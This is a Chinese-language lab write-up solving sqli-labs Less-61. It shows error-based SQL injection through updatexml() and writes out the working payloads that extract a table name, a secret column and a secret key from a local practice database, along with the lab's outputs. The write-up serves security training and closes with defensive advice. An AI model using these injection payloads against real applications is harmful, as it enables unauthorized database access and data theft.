## 题目: Sqli-labs Less-61（Challenge‑8）
> 靶场入口：`http://127.0.0.1/sqli-labs/Less-61/`

## 题目描述
Challenge 系列第八关：
```text
The objective of this challenge is to dump the (secret key) from only random table
from Database ('CHALLENGES') in Less than 5 attempts.
```

机会依旧只有 **5 次**，报错回显可用。闭合方式升级为**双层括号 + 单引号**：`id=(('$id'))`，payload 需要精准匹配引号与括号数量。

## 核心原理与前置分析
源码关键：
```
$times = 5;
$sql = "SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1";
...
else { print_r(mysql_error()); }   // 报错回显
```

三个特征：
1. **双层括号 + 单引号闭合**：`id=(('$id'))`，闭合符号为 `'))`；
2. **报错回显**：`updatexml()` / `extractvalue()` 可用；
3. **5 次预算**：表名 + 列名 + key 刚好消耗 3 次请求。

闭合测试对比：
| 闭合符号 | 结果 |
| --- | --- |
| **`'))`** | ✅ 正常触发 XPATH 报错 |
| `')` | ❌ 无报错 |
| `)` | ❌ 无报错 |
| `'` | ❌ 无报错 |

5 次机会的预算：
| 次数 | 用途 |
| --- | --- |
| 1 | 爆表名 |
| 2 | 爆 secret 列名 |
| 3 | 爆 secret key |
| 4‑5 | 容错 / 提交 |

报错注入的 `XPATH syntax error` 最多显示约 31 个字符，而表名（10 位）、列名（`secret_XXXX`，11 位）、secret key（24 位）都**在 31 字符以内**，所以每条都能一次出全，不需要 `substr` 分段。

## 解题思路
1. 请求 `setup‑db‑challenge.php` 重置数据库；
2. 访问挑战页拿 `challenge` cookie；
3. `1')) and updatexml(1,concat(0x7e,database()),1) -- -` 确认报错注入；
4. 依次爆表名、secret 列名、secret key；
5. 提交 secret key 通关。

## 解题步骤
### 1. 重置 + 拿 cookie
```
import requests
BASE = "http://127.0.0.1/sqli-labs/Less-61/"
SETUP = "http://127.0.0.1/sqli-labs/sql-connections/setup-db-challenge.php?id=" + BASE
requests.get(SETUP, timeout=30)
s = requests.Session()
s.get(BASE, timeout=15)
```

### 2. 确认闭合与报错注入
```
GET /sqli-labs/Less-61/?id=1%27))%20and%20updatexml(1,concat(0x7e,database()),1)%20--%20- HTTP/1.1
Host: 127.0.0.1
```

实测：
```
You have made : 1 of 5 attempts
XPATH syntax error: '~challenges'
```
→ 目标库是 `challenges`，报错注入可用。

### 3. 爆表名
```
GET /sqli-labs/Less-61/?id=1%27))%20and%20updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema='challenges')),1)%20--%20- HTTP/1.1
```
实测：
```
You have made : 1 of 5 attempts
XPATH syntax error: '~w3sakg5pg3'
```

### 4. 爆 secret 列名
```
GET /sqli-labs/Less-61/?id=1%27))%20and%20updatexml(1,concat(0x7e,(select%20column_name%20from%20information_schema.columns%20where%20table_schema='challenges'%20and%20column_name%20like%20'secret%25')),1)%20--%20- HTTP/1.1
```
实测：
```
You have made : 2 of 5 attempts
XPATH syntax error: '~secret_9ZDG'
```
> 
> 用 `like 'secret%'` 比 `limit 2,1` 稳，不依赖列顺序。

### 5. 爆 secret key
```
GET /sqli-labs/Less-61/?id=1%27))%20and%20updatexml(1,concat(0x7e,(select%20secret_9ZDG%20from%20w3sakg5pg3)),1)%20--%20- HTTP/1.1
```

实测：
```
You have made : 3 of 5 attempts
XPATH syntax error: '~0uHuIID24PmiZAtaAEnq32S1'
```

### 6. 提交
```
POST /sqli-labs/Less-61/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
key=0uHuIID24PmiZAtaAEnq32S1&answer_key=Submit
```
实测：出现 `images/Less‑54‑1.jpg`，通关。

## 踩坑记录
1. **闭合符少写括号**。本关是 `(('$id'))`，必须 **`'))`**；`')`、`)`、`'` 都不行。
2. **括号数量对不上**。多写一个 `)` 或 `'` 都会语法错，页面无报错（报错只对 SQL 语法错显示）。
3. **Reset 按钮不跳转**。meta refresh，脚本要直接请求 `setup‑db‑challenge.php`。
4. **成功图是 `Less‑54‑1.jpg`**。源码里写死，别用 `Less‑61‑1.jpg`。
5. **5 次预算**。表名 / 列名 /key 刚好 3 次，留 2 次容错。
6. **没先访问挑战页**。`challenge` cookie 需要首次 GET 才生成。

## 知识点总结
- **双层括号闭合注入**：`id=(('$id'))`，payload 闭合使用 `'))`，引号括号数量必须严格匹配。
- **报错注入**：`updatexml(1,concat(0x7e,数据),1)`，数据随 `XPATH syntax error` 一起返回。
- **31 字符上限**：报错信息有长度限制，短数据一次出，长数据要分段或 `hex()`。
- **5 次预算**：表名 + 列名 + key 刚好 3 次，留 2 次容错。
- **`like 'secret%'`**：比按列序号查更可靠，不依赖表结构顺序。
- **闭合符判断思路**：依次测试 `'`、`)`、`')`、`'))`、`"`、`")`，根据 XPATH 报错确认闭合。
- **防御**：预编译；关闭报错回显；限制请求次数。
